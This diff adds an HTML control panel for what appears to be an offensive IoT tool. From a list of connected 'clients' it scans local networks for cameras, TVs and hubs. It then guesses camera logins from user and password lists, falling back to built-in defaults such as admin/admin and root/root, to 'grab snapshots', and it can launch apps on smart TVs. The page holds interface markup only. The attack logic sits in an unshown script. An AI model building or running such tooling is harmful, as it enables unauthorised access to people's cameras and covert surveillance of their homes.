@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Iot</title>
+  <link rel="stylesheet" href="iot.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Iot</h1>
+    <span class="tag">cameras · tvs · hubs</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>source client</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">no clients seen yet</div>
+      </div>
+
+      <div class="card">
+        <h2>scan</h2>
+        <label for="targets">targets (one per line, blank = arp table)</label>
+        <textarea id="targets" rows="4" placeholder="192.168.1.50&#10;192.168.1.64"></textarea>
+        <div class="actions">
+          <button id="scan" class="btn primary">scan</button>
+          <button id="hubDump" class="btn ghost">hubs</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>snapshots</h2>
+        <label for="users">users (one per line)</label>
+        <textarea id="users" rows="2" placeholder="admin"></textarea>
+        <label for="passwords">passwords (one per line)</label>
+        <textarea id="passwords" rows="3" placeholder="admin&#10;12345"></textarea>
+        <div class="hint">blank uses the built-in camera list (admin/admin, admin/12345, root/root...).</div>
+        <button id="snapshot" class="btn danger block">grab snapshots</button>
+      </div>
+
+      <div class="card">
+        <h2>smart tv</h2>
+        <label for="tvHost">tv host</label>
+        <input id="tvHost" placeholder="192.168.1.70" />
+        <label for="tvApp">launch app</label>
+        <input id="tvApp" value="YouTube" />
+        <button id="tvLaunch" class="btn block">launch</button>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>devices <span id="devCount" class="count">0</span></h2>
+        <table class="tbl">
+          <thead><tr><th>host</th><th>kind</th><th>vendor</th><th>model</th><th>ports</th></tr></thead>
+          <tbody id="devBody"></tbody>
+        </table>
+        <div id="devEmpty" class="empty">no devices — run scan</div>
+      </div>
+
+      <div class="card">
+        <h2>snapshots <span id="snapCount" class="count">0</span></h2>
+        <div id="snapGrid" class="grid"></div>
+        <div id="snapEmpty" class="empty">no snapshots yet</div>
+      </div>
+
+      <div class="card">
+        <h2>hubs</h2>
+        <div id="hubList" class="feed empty">no hubs found</div>
+      </div>
+
+      <div class="card">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="iot.js"></script>
+</body>
+</html>
